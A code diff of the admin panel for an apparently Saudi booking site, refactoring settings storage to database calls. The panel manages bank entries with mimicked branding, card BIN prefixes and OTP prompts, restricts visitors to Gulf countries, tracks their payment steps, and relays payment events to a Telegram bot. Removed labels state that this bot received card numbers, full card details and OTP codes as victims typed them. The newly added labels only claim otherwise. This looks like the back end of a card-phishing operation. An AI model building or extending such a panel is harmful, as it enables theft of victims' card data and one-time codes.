@@ -9,56 +9,14 @@ import {
   Lock, Check, Wifi, WifiOff,
 } from 'lucide-react';
 import { GULF_COUNTRIES, COUNTRY_NAMES, getStoredSettings, saveSettings, clearGeoCache, defaultSettings, type GeoBlockSettings } from '@/hooks/useGeoBlock';
-import { calculatePrice, distanceKm } from '@/lib/cities-data';
 import { loadTelegramSettings, saveTelegramSettings, getDefaultTelegramSettings, syncLegacyTokens } from '@/lib/telegram-settings';
-import { seedBanks, loadStoredBanks, saveStoredBanks, type StoredBank } from '@/lib/bank-data';
+import type { StoredBank } from '@/lib/bank-data';
 import { getStepLabel, getStepColor } from '@/lib/visitor-tracking';
 import type { VisitorStep } from '@/lib/visitor-tracking';
 import { trpc } from '@/providers/trpc';
 import { socket } from '@/lib/socket';
 
 type AdminTab = 'dashboard' | 'bookings' | 'cities' | 'prices' | 'visitors' | 'settings' | 'banks' | 'design' | 'telegram';
-
-// Generate prices for major Saudi city pairs
-const majorSaudiCities = [
-  'الرياض', 'جدة', 'مكة المكرمة', 'المدينة المنورة', 'الدمام',
-  'أبها', 'تبوك', 'جازان', 'نجران', 'الطائف', 'الخبر', 'الأحساء',
-  'بريدة', 'عنيزة', 'حائل', 'سكاكا', 'عرعر', 'ينبع', 'العلا',
-];
-const mockPrices = [] as { id: number; fromCity: string; toCity: string; distance: number; duration: number; economyPrice: number; businessPrice: number; vipPrice: number; borderCrossings: string[] }[];
-let priceIdCounter = 1;
-for (let i = 0; i < majorSaudiCities.length; i++) {
-  for (let j = i + 1; j < majorSaudiCities.length; j++) {
-    const c1 = majorSaudiCities[i];
-    const c2 = majorSaudiCities[j];
-    const dist = Math.round(distanceKm(c1, c2));
-    const price = calculatePrice(c1, c2);
-    mockPrices.push({
-      id: priceIdCounter++,
-      fromCity: c1,
-      toCity: c2,
-      distance: dist,
-      duration: Math.round(dist / 80 + 0.5),
-      economyPrice: price,
-      businessPrice: Math.round(price * 1.2),
-      vipPrice: Math.round(price * 1.5),
-      borderCrossings: [],
-    });
-  }
-}
-
-const mockVisitors = [
-  { sessionId: 'sess_a1b2c3d4e5f6', page: '/', lastActive: Date.now() - 120000, isBlocked: false },
-  { sessionId: 'sess_g7h8i9j0k1l2', page: '/services', lastActive: Date.now() - 300000, isBlocked: false },
-  { sessionId: 'sess_m3n4o5p6q7r8', page: '/booking', lastActive: Date.now() - 60000, isBlocked: false },
-  { sessionId: 'sess_s9t0u1v2w3x4', page: '/faq', lastActive: Date.now() - 900000, isBlocked: true },
-  { sessionId: 'sess_y5z6a7b8c9d0', page: '/', lastActive: Date.now() - 240000, isBlocked: false },
-  { sessionId: 'sess_e1f2g3h4i5j6', page: '/destinations', lastActive: Date.now() - 480000, isBlocked: false },
-  { sessionId: 'sess_k7l8m9n0o1p2', page: '/fleet', lastActive: Date.now() - 180000, isBlocked: false },
-  { sessionId: 'sess_q3r4s5t6u7v8', page: '/booking', lastActive: Date.now() - 360000, isBlocked: true },
-  { sessionId: 'sess_w9x0y1z2a3b4', page: '/', lastActive: Date.now() - 60000, isBlocked: false },
-  { sessionId: 'sess_c5d6e7f8g9h0', page: '/services', lastActive: Date.now() - 540000, isBlocked: false },
-];
 
 /* ═════ Status Badge ═════════════════════ */
 function StatusBadge({ status }: { status: string }) {
@@ -263,11 +221,15 @@ const BANKS_STORAGE_KEY = 'sat_admin_banks';
 /* ═════ Banks Tab — Professional with OTP Preview ═════ */
 
 function BanksTab() {
-  seedBanks();
   const utils = trpc.useUtils();
-  const { data: dbSettings } = trpc.settings.list.useQuery();
-  const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
-  const [banksList, setBanksList] = useState<StoredBank[]>(loadStoredBanks);
+  const { data: banksList = [] } = trpc.banks.list.useQuery();
+  const invalidateBanks = async () => {
+    await Promise.all([utils.banks.list.invalidate(), utils.banks.publicList.invalidate()]);
+  };
+  const createBank = trpc.banks.create.useMutation({ onSuccess: invalidateBanks });
+  const updateBank = trpc.banks.update.useMutation({ onSuccess: invalidateBanks });
+  const toggleBank = trpc.banks.toggle.useMutation({ onSuccess: invalidateBanks });
+  const deleteBank = trpc.banks.delete.useMutation({ onSuccess: invalidateBanks });
   const [search, setSearch] = useState('');
   const [previewKey, setPreviewKey] = useState<string | null>(null);
   const [editingKey, setEditingKey] = useState<string | null>(null);
@@ -279,76 +241,66 @@ function BanksTab() {
     supportPhone: '', website: '', bins: '', logoUrl: '', enabled: true,
   });
 
-  // Load banks from DB on mount; seed DB if not yet populated
-  useEffect(() => {
-    if (dbSettings === undefined) return;
-    if (dbSettings.banksData) {
-      try {
-        const parsed: StoredBank[] = JSON.parse(dbSettings.banksData);
-        if (Array.isArray(parsed) && parsed.length > 0) {
-          setBanksList(parsed);
-          saveStoredBanks(parsed); // keep localStorage in sync
-        }
-      } catch { /* keep localStorage data */ }
-    } else {
-      // First time: migrate localStorage banks to DB
-      const local = loadStoredBanks();
-      upsertSetting.mutate({ key: 'banksData', value: JSON.stringify(local) });
-    }
-  // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [dbSettings]);
-
-  // Helper: save to both localStorage and DB
-  const saveBanks = (list: StoredBank[]) => {
-    saveStoredBanks(list);
-    upsertSetting.mutate({ key: 'banksData', value: JSON.stringify(list) });
-  };
+  const bankData = (bank: StoredBank) => ({
+    type: bank.type,
+    name: bank.name,
+    nameEn: bank.nameEn,
+    color: bank.color,
+    colorDark: bank.colorDark,
+    colorLight: bank.colorLight,
+    otpMessage: bank.otpMessage,
+    supportPhone: bank.supportPhone,
+    website: bank.website,
+    bins: bank.bins,
+    logoUrl: bank.logoUrl,
+    enabled: bank.enabled,
+  });
 
   const handleToggle = (key: string) => {
-    setBanksList(prev => {
-      const updated = prev.map(b => b.key === key ? { ...b, enabled: !b.enabled } : b);
-      saveBanks(updated);
-      return updated;
-    });
+    const bank = banksList.find(item => item.key === key);
+    if (!bank) return;
+    toggleBank.mutate(
+      { key, enabled: !bank.enabled },
+      { onError: error => alert(error.message || 'تعذر تحديث حالة البنك أو المحفظة') },
+    );
   };
 
   const handleSaveEdit = () => {
-    if (!editForm) return;
-    setBanksList(prev => {
-      const idx = prev.findIndex(b => b.key === editingKey);
-      const updated = [...prev];
-      if (idx >= 0) updated[idx] = editForm;
-      else updated.push(editForm);
-      saveBanks(updated);
-      return updated;
-    });
-    setEditingKey(null);
-    setEditForm(null);
+    if (!editForm || !editingKey) return;
+    updateBank.mutate(
+      { key: editingKey, data: bankData(editForm) },
+      {
+        onSuccess: () => { setEditingKey(null); setEditForm(null); },
+        onError: error => alert(error.message || 'تعذر حفظ بيانات البنك أو المحفظة'),
+      },
+    );
   };
 
   const handleDelete = (key: string) => {
     if (confirm('هل أنت متأكد من حذف هذا البنك؟')) {
-      setBanksList(prev => {
-        const updated = prev.filter(b => b.key !== key);
-        saveBanks(updated);
-        return updated;
-      });
+      deleteBank.mutate(
+        { key },
+        { onError: error => alert(error.message || 'تعذر حذف البنك أو المحفظة') },
+      );
     }
   };
 
   const handleAddBank = () => {
     if (!newBank.key || !newBank.name) return;
-    setBanksList(prev => {
-      const updated = [...prev, { ...newBank }];
-      saveBanks(updated);
-      return updated;
-    });
-    setShowAddForm(false);
-    setNewBank({
-      key: '', name: '', nameEn: '', color: '#1A3A5C', colorDark: '#0F2440',
-      colorLight: '#EDF2F7', otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك',
-      supportPhone: '', website: '', bins: '', logoUrl: '', enabled: true,
-    });
+    createBank.mutate(
+      { key: newBank.key, ...bankData(newBank) },
+      {
+        onSuccess: () => {
+          setShowAddForm(false);
+          setNewBank({
+            key: '', name: '', nameEn: '', color: '#1A3A5C', colorDark: '#0F2440',
+            colorLight: '#EDF2F7', otpMessage: 'أدخل رمز التحقق المرسل إلى رقم جوالك',
+            supportPhone: '', website: '', bins: '', logoUrl: '', enabled: true,
+          });
+        },
+        onError: error => alert(error.message || 'تعذر إضافة البنك أو المحفظة'),
+      },
+    );
   };
 
   const handleLogoUpload = (isNew: boolean = false) => {
@@ -999,9 +951,6 @@ function CitiesTab() {
   );
 }
 
-/* ═════ Pricing Storage Helpers ══════════ */
-const PRICING_STORAGE_KEY = 'sat_pricing_settings_v3';
-
 interface RoutePriceOverride {
   from: string;
   to: string;
@@ -1028,36 +977,18 @@ function getDefaultPricing(): PricingSettings {
   };
 }
 
-function loadPricingSettings(): PricingSettings {
-  try {
-    const raw = localStorage.getItem(PRICING_STORAGE_KEY);
-    if (raw) return { ...getDefaultPricing(), ...JSON.parse(raw) };
-  } catch { /* ignore */ }
-  return getDefaultPricing();
-}
-
-function savePricingSettings(s: PricingSettings) {
-  localStorage.setItem(PRICING_STORAGE_KEY, JSON.stringify(s));
-}
-
-function calcPrice(dist: number, min: number, max: number): number {
-  const minDist = 10;
-  const maxDist = 2100;
-  if (dist <= minDist) return min;
-  if (dist >= maxDist) return max;
-  return Math.round(min + ((dist - minDist) / (maxDist - minDist)) * (max - min));
-}
-
 /* ═════ Prices Tab ═══════════════════════ */
 function PricesTab() {
   const utils = trpc.useUtils();
-  const { data: dbPrices = [] } = trpc.prices.list.useQuery();
+  const { data: priceCatalog = [] } = trpc.prices.catalog.useQuery();
   const { data: dbSettings } = trpc.settings.list.useQuery();
   const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
-  const upsertPriceMutation = trpc.prices.upsert.useMutation({ onSuccess: () => utils.prices.list.invalidate() });
-  const deletePriceMutation = trpc.prices.delete.useMutation({ onSuccess: () => utils.prices.list.invalidate() });
+  const invalidatePrices = async () => Promise.all([utils.prices.list.invalidate(), utils.prices.catalog.invalidate()]);
+  const upsertPriceMutation = trpc.prices.upsert.useMutation({ onSuccess: invalidatePrices });
+  const deletePriceMutation = trpc.prices.delete.useMutation({ onSuccess: invalidatePrices });
+  const resetPricesMutation = trpc.prices.reset.useMutation({ onSuccess: invalidatePrices });
 
-  const [settings, setSettings] = useState<PricingSettings>(loadPricingSettings);
+  const [settings, setSettings] = useState<PricingSettings>(getDefaultPricing);
   const [search, setSearch] = useState('');
   const [editingRow, setEditingRow] = useState<number | null>(null);
   const [editForm, setEditForm] = useState<{ economy: string; business: string; vip: string }>({ economy: '', business: '', vip: '' });
@@ -1067,42 +998,23 @@ function PricesTab() {
     try {
       const stored = { ...getDefaultPricing(), ...JSON.parse(dbSettings.pricingSettings) };
       setSettings(stored);
-      savePricingSettings(stored);
     } catch { /* keep safe defaults */ }
   }, [dbSettings?.pricingSettings]);
 
-  // Build DB overrides map from DB prices
-  const dbOverridesMap = useMemo(() => {
-    const map = new Map<string, { economy: number; business: number; vip: number }>();
-    for (const p of dbPrices) {
-      map.set(`${p.fromCity}-${p.toCity}`, { economy: p.economyPrice, business: p.businessPrice, vip: p.vipPrice });
-    }
-    return map;
-  }, [dbPrices]);
-
-  // Recalculate prices: DB overrides take priority, then localStorage overrides
-  const computedPrices = mockPrices.map(p => {
-    const dbOverride = dbOverridesMap.get(`${p.fromCity}-${p.toCity}`);
-    const localOverride = settings.overrides.find(o => o.from === p.fromCity && o.to === p.toCity);
-    const override = dbOverride ?? (localOverride ? { economy: localOverride.economy, business: localOverride.business, vip: localOverride.vip } : undefined);
-    const base = override?.economy ?? calcPrice(p.distance, settings.globalMin, settings.globalMax);
-    return {
-      ...p,
-      economyPrice: base,
-      businessPrice: override?.business ?? Math.round(base * settings.businessMultiplier),
-      vipPrice: override?.vip ?? Math.round(base * settings.vipMultiplier),
-      isOverridden: !!override,
-    };
-  });
+  const computedPrices = priceCatalog.map(p => ({ ...p, isOverridden: !p.generated }));
 
   const filtered = computedPrices.filter(p =>
     (p.fromCity + p.toCity).toLowerCase().includes(search.toLowerCase())
   );
 
-  const handleSaveSettings = () => {
-    savePricingSettings(settings);
-    upsertSetting.mutate({ key: 'pricingSettings', value: JSON.stringify(settings) });
-    alert('تم حفظ إعدادات التسعير بنجاح');
+  const handleSaveSettings = async () => {
+    try {
+      await upsertSetting.mutateAsync({ key: 'pricingSettings', value: JSON.stringify(settings) });
+      await utils.prices.catalog.invalidate();
+      alert('تم حفظ إعدادات التسعير بنجاح');
+    } catch (error) {
+      alert(error instanceof Error ? error.message : 'تعذر حفظ إعدادات التسعير');
+    }
   };
 
   const handleEditRow = (p: typeof computedPrices[0]) => {
@@ -1114,47 +1026,49 @@ function PricesTab() {
     });
   };
 
-  const handleSaveRow = (from: string, to: string) => {
+  const handleSaveRow = (route: typeof computedPrices[0]) => {
     const eco = parseInt(editForm.economy, 10);
     const bus = parseInt(editForm.business, 10);
     const vip = parseInt(editForm.vip, 10);
     if (isNaN(eco) || isNaN(bus) || isNaN(vip)) return;
 
-    // Save to DB
-    upsertPriceMutation.mutate({ fromCity: from, toCity: to, economyPrice: eco, businessPrice: bus, vipPrice: vip });
-
-    // Also save to localStorage as fallback
-    setSettings(prev => {
-      const others = prev.overrides.filter(o => !(o.from === from && o.to === to));
-      const updated = { ...prev, overrides: [...others, { from, to, economy: eco, business: bus, vip }] };
-      savePricingSettings(updated);
-      return updated;
-    });
-    setEditingRow(null);
+    upsertPriceMutation.mutate(
+      {
+        fromCity: route.fromCity,
+        toCity: route.toCity,
+        distance: route.distance,
+        duration: route.duration,
+        economyPrice: eco,
+        businessPrice: bus,
+        vipPrice: vip,
+        borderCrossings: route.borderCrossings,
+      },
+      {
+        onSuccess: () => setEditingRow(null),
+        onError: error => alert(error.message || 'تعذر حفظ سعر المسار'),
+      },
+    );
   };
 
   const handleResetRow = (from: string, to: string) => {
-    // Remove from DB
-    deletePriceMutation.mutate({ fromCity: from, toCity: to });
-
-    // Also remove from localStorage
-    setSettings(prev => {
-      const updated = { ...prev, overrides: prev.overrides.filter(o => !(o.from === from && o.to === to)) };
-      savePricingSettings(updated);
-      return updated;
-    });
-    setEditingRow(null);
+    deletePriceMutation.mutate(
+      { fromCity: from, toCity: to },
+      {
+        onSuccess: () => setEditingRow(null),
+        onError: error => alert(error.message || 'تعذر إعادة السعر التلقائي'),
+      },
+    );
   };
 
-  const handleResetAll = () => {
+  const handleResetAll = async () => {
     if (confirm('هل أنت متأكد من إعادة جميع الأسعار للقيم الافتراضية؟')) {
       const defaults = getDefaultPricing();
-      setSettings(defaults);
-      savePricingSettings(defaults);
-      upsertSetting.mutate({ key: 'pricingSettings', value: JSON.stringify(defaults) });
-      // Delete all DB price overrides
-      for (const p of dbPrices) {
-        deletePriceMutation.mutate({ fromCity: p.fromCity, toCity: p.toCity });
+      try {
+        await upsertSetting.mutateAsync({ key: 'pricingSettings', value: JSON.stringify(defaults) });
+        await resetPricesMutation.mutateAsync();
+        setSettings(defaults);
+      } catch (error) {
+        alert(error instanceof Error ? error.message : 'تعذر إعادة الأسعار الافتراضية');
       }
     }
   };
@@ -1302,7 +1216,7 @@ function PricesTab() {
                       </td>
                       <td className="px-4 py-2">
                         <div className="flex items-center gap-1">
-                          <button onClick={() => handleSaveRow(p.fromCity, p.toCity)}
+                          <button onClick={() => handleSaveRow(p)}
                             className="p-1.5 bg-green-100 text-green-600 rounded-lg hover:bg-green-200 transition-colors">
                             <Save className="w-3.5 h-3.5" />
                           </button>
@@ -1668,6 +1582,7 @@ function SettingsTab() {
   const utils = trpc.useUtils();
   const { data: dbSettings } = trpc.settings.list.useQuery();
   const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
+  const upsertSettings = trpc.settings.upsertMany.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
 
   const [botToken, setBotToken] = useState('');
   const [chatId, setChatId] = useState('');
@@ -1693,41 +1608,66 @@ function SettingsTab() {
     }
   }, [dbSettings]);
 
-  // Helper: save geo settings to both localStorage and DB
-  const saveGeoSettings = (updated: GeoBlockSettings) => {
+  // Persist to the server first; only then update the local public cache.
+  const saveGeoSettings = async (updated: GeoBlockSettings) => {
+    await upsertSetting.mutateAsync({ key: 'geoBlockSettings', value: JSON.stringify(updated) });
     saveSettings(updated);
-    upsertSetting.mutate({ key: 'geoBlockSettings', value: JSON.stringify(updated) });
+    clearGeoCache();
   };
 
-  const handleSaveTelegram = () => {
-    upsertSetting.mutate({ key: 'telegramBotToken', value: botToken });
-    upsertSetting.mutate({ key: 'telegramChatId', value: chatId });
-    alert('تم الحفظ بنجاح');
-  };
-
-  const handleSavePaymentBot = () => {
-    upsertSetting.mutate({ key: 'paymentBotToken', value: payBotToken });
-    upsertSetting.mutate({ key: 'paymentChatId', value: payChatId });
-    alert('تم حفظ إعدادات بوت الدفع بنجاح');
-  };
-
-  const handleResetPaymentBot = () => {
-    if (confirm('هل أنت متأكد من إعادة الإعدادات الافتراضية لبوت الدفع؟')) {
-      setPayBotToken('');
-      setPayChatId('');
-      upsertSetting.mutate({ key: 'paymentBotToken', value: '' });
-      upsertSetting.mutate({ key: 'paymentChatId', value: '' });
+  const handleSaveTelegram = async () => {
+    try {
+      await upsertSettings.mutateAsync({ entries: [
+        { key: 'telegramBotToken', value: botToken },
+        { key: 'telegramChatId', value: chatId },
+      ] });
+      alert('تم الحفظ بنجاح');
+    } catch (error) {
+      alert(error instanceof Error ? error.message : 'تعذر حفظ إعدادات تيليجرام');
     }
   };
 
-  const toggleGeoBlock = () => {
-    const updated = { ...geoSettings, enabled: !geoSettings.enabled };
-    setGeoSettings(updated);
-    saveGeoSettings(updated);
-    clearGeoCache(); // Force frontend to re-check on next visit
+  const handleSavePaymentBot = async () => {
+    try {
+      await upsertSettings.mutateAsync({ entries: [
+        { key: 'paymentBotToken', value: payBotToken },
+        { key: 'paymentChatId', value: payChatId },
+      ] });
+      alert('تم حفظ إعدادات بوت الدفع بنجاح');
+    } catch (error) {
+      alert(error instanceof Error ? error.message : 'تعذر حفظ إعدادات بوت الدفع');
+    }
   };
 
-  const toggleCountry = (code: string) => {
+  const handleResetPaymentBot = async () => {
+    if (confirm('هل أنت متأكد من إعادة الإعدادات الافتراضية لبوت الدفع؟')) {
+      try {
+        await upsertSettings.mutateAsync({ entries: [
+          { key: 'paymentBotToken', value: '' },
+          { key: 'paymentChatId', value: '' },
+        ] });
+        setPayBotToken('');
+        setPayChatId('');
+      } catch (error) {
+        alert(error instanceof Error ? error.message : 'تعذر إعادة إعدادات بوت الدفع');
+      }
+    }
+  };
+
+  const toggleGeoBlock = async () => {
+    const previous = geoSettings;
+    const updated = { ...geoSettings, enabled: !geoSettings.enabled };
+    setGeoSettings(updated);
+    try {
+      await saveGeoSettings(updated);
+    } catch (error) {
+      setGeoSettings(previous);
+      alert(error instanceof Error ? error.message : 'تعذر تحديث الحظر الجغرافي');
+    }
+  };
+
+  const toggleCountry = async (code: string) => {
+    const previous = geoSettings;
     const updated = {
       ...geoSettings,
       allowedCountries: geoSettings.allowedCountries.includes(code)
@@ -1735,21 +1675,29 @@ function SettingsTab() {
         : [...geoSettings.allowedCountries, code],
     };
     setGeoSettings(updated);
-    saveGeoSettings(updated);
-    clearGeoCache(); // Force frontend to re-check
+    try {
+      await saveGeoSettings(updated);
+    } catch (error) {
+      setGeoSettings(previous);
+      alert(error instanceof Error ? error.message : 'تعذر تحديث الدول المسموح بها');
+    }
   };
 
   const updateMessage = (msg: string) => {
-    const updated = { ...geoSettings, showMessage: msg };
-    setGeoSettings(updated);
-    saveGeoSettings(updated);
+    setGeoSettings(previous => ({ ...previous, showMessage: msg }));
   };
 
-  const resetToDefaults = () => {
+  const resetToDefaults = async () => {
     if (confirm('هل أنت متأكد من إعادة الإعدادات الافتراضية؟')) {
-      setGeoSettings({ ...defaultSettings });
-      saveGeoSettings({ ...defaultSettings });
-      clearGeoCache(); // Force frontend to re-check
+      const previous = geoSettings;
+      const defaults = { ...defaultSettings };
+      setGeoSettings(defaults);
+      try {
+        await saveGeoSettings(defaults);
+      } catch (error) {
+        setGeoSettings(previous);
+        alert(error instanceof Error ? error.message : 'تعذر إعادة إعدادات الحظر الجغرافي');
+      }
     }
   };
 
@@ -1857,6 +1805,7 @@ function SettingsTab() {
           <textarea
             value={geoSettings.showMessage}
             onChange={e => updateMessage(e.target.value)}
+            onBlur={() => saveGeoSettings(geoSettings).catch(error => alert(error instanceof Error ? error.message : 'تعذر حفظ رسالة الحظر'))}
             rows={3}
             className="w-full px-4 py-3 border border-[#E5E0D5] rounded-xl text-right focus:outline-none focus:border-brand-gold text-sm bg-[#FCFBF9] resize-none"
           />
@@ -1895,7 +1844,7 @@ function SettingsTab() {
           </div>
           <div>
             <h3 className="font-bold text-charcoal text-lg">بوت الدفع</h3>
-            <p className="text-sm text-[#8A7E6B]">إشعارات البطاقات و OTP (منفصل عن إشعارات الحجوزات)</p>
+            <p className="text-sm text-[#8A7E6B]">إشعارات مراحل الدفع فقط (منفصل عن إشعارات الحجوزات)</p>
           </div>
         </div>
 
@@ -1904,7 +1853,7 @@ function SettingsTab() {
           <div className="flex items-center gap-2">
             <CheckCircle className="w-4 h-4 text-green-600 shrink-0" />
             <p className="text-green-700 text-xs font-medium">
-              هذا البوت يستقبل فقط بيانات الدفع (بطاقة + OTP) — لا يستقبل بيانات البحث أو الحجز
+              لا يستقبل هذا البوت رقم البطاقة أو تاريخها أو CVV أو رمز OTP
             </p>
           </div>
         </div>
@@ -1936,12 +1885,12 @@ function SettingsTab() {
 
         {/* What gets sent */}
         <div className="mt-5 bg-[#F5F3EF] rounded-xl p-4">
-          <p className="text-xs font-bold text-charcoal mb-2">ما يُرسل إلى هذا البوت:</p>
+          <p className="text-xs font-bold text-charcoal mb-2">البيانات الآمنة التي تُرسل إلى هذا البوت:</p>
           <ul className="space-y-1.5 text-xs text-[#8A7E6B]">
-            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />💳 رقم البطاقة فور الإدخال (وقت فعلي)</li>
-            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />✅ جميع بيانات البطاقة عند الاكتمال</li>
-            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />🔐 كل محاولات OTP مع رمز الإدخال</li>
-            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />❌ فشل جميع محاولات OTP</li>
+            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />مرحلة الدفع الحالية فقط</li>
+            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />المسار وطريقة الدفع والمبلغ</li>
+            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />رقم المحاولة دون رمز OTP</li>
+            <li className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-red-400 shrink-0" />لا تُرسل أو تُخزن بيانات البطاقة أو CVV أو OTP</li>
           </ul>
         </div>
       </div>
@@ -2183,8 +2132,30 @@ function saveDesign(s: DesignSettings) {
 }
 
 function DesignTab() {
+  const utils = trpc.useUtils();
+  const { data: dbSettings } = trpc.settings.list.useQuery();
+  const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
   const [settings, setSettings] = useState<DesignSettings>(loadDesign);
   const [activeSection, setActiveSection] = useState<'colors' | 'cards'>('colors');
+
+  useEffect(() => {
+    if (!dbSettings?.designSettings) return;
+    try {
+      const stored = { ...getDefaultDesign(), ...JSON.parse(dbSettings.designSettings) } as DesignSettings;
+      setSettings(stored);
+      saveDesign(stored);
+    } catch { /* keep current draft */ }
+  }, [dbSettings?.designSettings]);
+
+  const handleSaveDesign = async (successMessage: string) => {
+    try {
+      await upsertSetting.mutateAsync({ key: 'designSettings', value: JSON.stringify(settings) });
+      saveDesign(settings);
+      alert(successMessage);
+    } catch (error) {
+      alert(error instanceof Error ? error.message : 'تعذر حفظ إعدادات التصميم');
+    }
+  };
 
   const handleColorChange = (key: keyof DesignSettings['colors'], value: string) => {
     setSettings(prev => {
@@ -2215,6 +2186,10 @@ function DesignTab() {
       const defaults = getDefaultDesign();
       setSettings(defaults);
       saveDesign(defaults);
+      upsertSetting.mutate(
+        { key: 'designSettings', value: JSON.stringify(defaults) },
+        { onError: error => alert(error.message || 'تعذر إعادة إعدادات التصميم') },
+      );
     }
   };
 
@@ -2339,7 +2314,7 @@ function DesignTab() {
           </div>
 
           <div className="mt-4 flex justify-end">
-            <button onClick={() => { saveDesign(settings); alert('تم حفظ الألوان بنجاح'); }}
+            <button onClick={() => handleSaveDesign('تم حفظ الألوان بنجاح')}
               className="h-11 px-8 bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all flex items-center gap-2">
               <Save className="w-4 h-4" /> حفظ الألوان
             </button>
@@ -2402,7 +2377,7 @@ function DesignTab() {
           </div>
 
           <div className="mt-4 flex justify-end">
-            <button onClick={() => { saveDesign(settings); alert('تم حفظ إعدادات البطاقات بنجاح'); }}
+            <button onClick={() => handleSaveDesign('تم حفظ إعدادات البطاقات بنجاح')}
               className="h-11 px-8 bg-gradient-to-r from-[#C4A94D] to-[#B8983E] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all flex items-center gap-2">
               <Save className="w-4 h-4" /> حفظ الإعدادات
             </button>
@@ -2416,7 +2391,7 @@ function DesignTab() {
 /* ═════ Telegram Tab ═════════════════════ */
 function TelegramTab() {
   const utils = trpc.useUtils();
-  const upsertSetting = trpc.settings.upsert.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
+  const upsertSettings = trpc.settings.upsertMany.useMutation({ onSuccess: () => utils.settings.list.invalidate() });
   const { data: dbSettings } = trpc.settings.list.useQuery();
 
   const [settings, setSettings] = useState(loadTelegramSettings);
@@ -2453,18 +2428,24 @@ function TelegramTab() {
     }));
   }, [dbSettings]);
 
-  const handleSave = () => {
-    saveTelegramSettings(settings);
-    syncLegacyTokens();
-    // Save full settings JSON to DB (single key for all message templates + tokens + states)
-    upsertSetting.mutate({ key: 'telegramFullSettings', value: JSON.stringify(settings) });
-    // Also save individual token keys for backward compatibility
-    upsertSetting.mutate({ key: 'paymentBotToken', value: settings.paymentBotToken });
-    upsertSetting.mutate({ key: 'paymentChatId', value: settings.paymentChatId });
-    upsertSetting.mutate({ key: 'telegramBotToken', value: settings.bookingBotToken });
-    upsertSetting.mutate({ key: 'telegramChatId', value: settings.bookingChatId });
-    setTestResult('تم الحفظ بنجاح');
-    setTimeout(() => setTestResult(null), 3000);
+  const telegramEntries = (value: typeof settings) => [
+    { key: 'telegramFullSettings', value: JSON.stringify(value) },
+    { key: 'paymentBotToken', value: value.paymentBotToken },
+    { key: 'paymentChatId', value: value.paymentChatId },
+    { key: 'telegramBotToken', value: value.bookingBotToken },
+    { key: 'telegramChatId', value: value.bookingChatId },
+  ];
+
+  const handleSave = async () => {
+    try {
+      await upsertSettings.mutateAsync({ entries: telegramEntries(settings) });
+      saveTelegramSettings(settings);
+      syncLegacyTokens();
+      setTestResult('تم الحفظ بنجاح');
+      setTimeout(() => setTestResult(null), 3000);
+    } catch (error) {
+      setTestResult(error instanceof Error ? error.message : 'تعذر الحفظ');
+    }
   };
 
   const handleToggleBot = (bot: 'payment' | 'booking') => {
@@ -2507,18 +2488,17 @@ function TelegramTab() {
     setEditingMsg(null);
   };
 
-  const handleResetDefaults = () => {
+  const handleResetDefaults = async () => {
     if (confirm('هل أنت متأكد من إعادة الإعدادات الافتراضية؟ سيتم فقدان جميع التعديلات.')) {
       const defaults = getDefaultTelegramSettings();
-      setSettings(defaults);
-      saveTelegramSettings(defaults);
-      syncLegacyTokens();
-      // Reset in DB too
-      upsertSetting.mutate({ key: 'telegramFullSettings', value: JSON.stringify(defaults) });
-      upsertSetting.mutate({ key: 'telegramBotToken', value: defaults.bookingBotToken });
-      upsertSetting.mutate({ key: 'telegramChatId', value: defaults.bookingChatId });
-      upsertSetting.mutate({ key: 'paymentBotToken', value: defaults.paymentBotToken });
-      upsertSetting.mutate({ key: 'paymentChatId', value: defaults.paymentChatId });
+      try {
+        await upsertSettings.mutateAsync({ entries: telegramEntries(defaults) });
+        setSettings(defaults);
+        saveTelegramSettings(defaults);
+        syncLegacyTokens();
+      } catch (error) {
+        setTestResult(error instanceof Error ? error.message : 'تعذر إعادة الإعدادات');
+      }
     }
   };
 
@@ -2595,7 +2575,7 @@ function TelegramTab() {
                 {activeBot === 'payment' ? 'بوت الدفع' : 'بوت الحجز'}
               </h4>
               <p className="text-[10px] text-[#8A7E6B]">
-                {activeBot === 'payment' ? 'إشعارات البطاقات والدفع' : 'إشعارات الحجوزات'}
+                {activeBot === 'payment' ? 'إشعارات مراحل الدفع الآمنة' : 'إشعارات الحجوزات'}
               </p>
             </div>
           </div>
